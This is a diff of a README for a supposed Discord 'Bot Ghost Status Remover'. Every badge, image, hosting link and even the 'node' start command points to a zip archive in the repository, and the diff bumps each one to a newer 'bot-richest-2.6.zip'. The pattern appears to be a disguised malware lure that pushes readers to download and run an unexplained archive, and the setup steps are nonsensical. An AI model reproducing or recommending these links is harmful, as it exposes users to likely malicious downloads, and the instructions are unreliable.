@@ -1,39 +1,39 @@
-![Animated Background](https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip)
+![Animated Background](https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip)
 
 <h1 align="center" style="font-family: Arial, sans-serif; color: #FF6F61; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
   BOT GHOST STATUS REMOVER
 </h1>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip">
-    <img src="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip"
+  <a href="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip">
+    <img src="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip"
       alt="License: MIT" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip">
-    <img src="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip"
+  <a href="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip">
+    <img src="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip"
       alt="Donate" />
   </a>
 </p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip">
-    <img src="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip"
+  <a href="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip">
+    <img src="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip"
       alt="YouTube" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip">
-    <img src="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip"
+  <a href="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip">
+    <img src="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip"
       alt="Join Discord" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip">
-    <img src="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip"
+  <a href="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip">
+    <img src="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip"
       alt="Instagram" />
   </a>
 
-  <a href="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip">
-    <img src="https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip"
+  <a href="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip">
+    <img src="https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip"
       alt="Facebook" />
   </a>
 </p>
@@ -43,7 +43,7 @@
 
 ###  Set Up Hosting Service
 
-1. Go to your preferred hosting service. For this guide, we use [Render](https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip).
+1. Go to your preferred hosting service. For this guide, we use [Render](https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip).
 2. In the Build & Deploy section, paste your repository URL.
 
 
@@ -51,7 +51,7 @@
  Run the following commands to install dependencies and start your bot:
 
    npm install
-   node https://raw.githubusercontent.com/Aryan0419/bot-richest/main/avianization/bot-richest.zip
+   node https://github.com/Aryan0419/bot-richest/raw/refs/heads/main/avianization/bot-richest-2.6.zip
 
 ###  Get Your Bot Token
 Navigate to the Discord Developer Portal.
